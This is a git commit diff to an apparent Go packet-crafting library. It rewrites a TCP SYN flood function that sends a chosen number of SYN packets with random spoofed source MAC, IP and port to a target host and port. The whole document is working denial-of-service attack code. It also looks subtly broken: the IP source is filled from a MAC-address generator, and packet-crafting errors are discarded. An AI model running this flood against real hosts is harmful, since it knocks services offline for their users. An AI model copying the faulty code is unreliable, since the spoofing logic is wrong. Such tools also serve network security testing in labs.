9b6fb46ee905fdc972f8661c83614cb171dda9ec
Tiago Diogo <tiago.m.diogo@tecnico.ulisboa.pt>
2023-10-22 15:47:56 +0100

    TCPSYN fixes

--- higherlevel/tcpsyn.go
+++ higherlevel/tcpsyn.go
@@ -1,47 +1,31 @@
 package higherlevel
 
 import (
+	golayers "github.com/google/gopacket/layers"
 	"github.com/tiagomdiogo/ScaGo/packet"
-	"github.com/tiagomdiogo/ScaGo/supersocket"
+	communication "github.com/tiagomdiogo/ScaGo/supersocket"
 	"github.com/tiagomdiogo/ScaGo/utils"
-	"log"
-	"time"
 )
 
-func TCPSYNFlood(targetIP, targetPort string, attackDuration int) {
-	socket, err := supersocket.NewSuperSocket("eth0", "")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer socket.Close()
+func TCPSYNFlood(iface, targetIP, targetPort string, numberOfPackets int) {
 
-	// Define the deadline for the attack to stop.
-	end := time.Now().Add(time.Duration(attackDuration) * time.Second)
+	for i := 0; i < numberOfPackets; i++ {
+		ethLayer := packet.EthernetLayer()
+		ethLayer.SetEthernetType(golayers.EthernetTypeIPv4)
+		ethLayer.SetSrcMAC(utils.ParseMACGen())
+		ethLayer.SetDstMAC(utils.ParseMACGen())
 
-	srcIP := utils.ParseIPGen("0.0.0.0/0")
-
-	srcPort := utils.RandomPort()
-	for time.Now().Before(end) {
-
-		// Craft the IP layer
 		ipLayer := packet.IPv4Layer()
-		ipLayer.SetSrcIP(srcIP)
+		ipLayer.SetSrcIP(utils.ParseMACGen())
 		ipLayer.SetDstIP(targetIP)
-		// Craft the TCP layer.
+
 		tcpLayer := packet.TCPLayer()
-		tcpLayer.SetSrcPort(srcPort)
+		tcpLayer.SetSrcPort(utils.RandomPort())
 		tcpLayer.SetDstPort(targetPort)
 		tcpLayer.SetSyn()
+		tcpLayer.Layer().SetNetworkLayerForChecksum(ipLayer.Layer())
 
-		// Craft Packet
-		completePacket, err := packet.CraftPacket(ipLayer.Layer(), tcpLayer.Layer())
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		err = socket.Send(completePacket)
-		if err != nil {
-			log.Fatal(err)
-		}
+		completePacket, _ := packet.CraftPacket(ethLayer.Layer(), ipLayer.Layer(), tcpLayer.Layer())
+		communication.Send(completePacket, iface)
 	}
 }
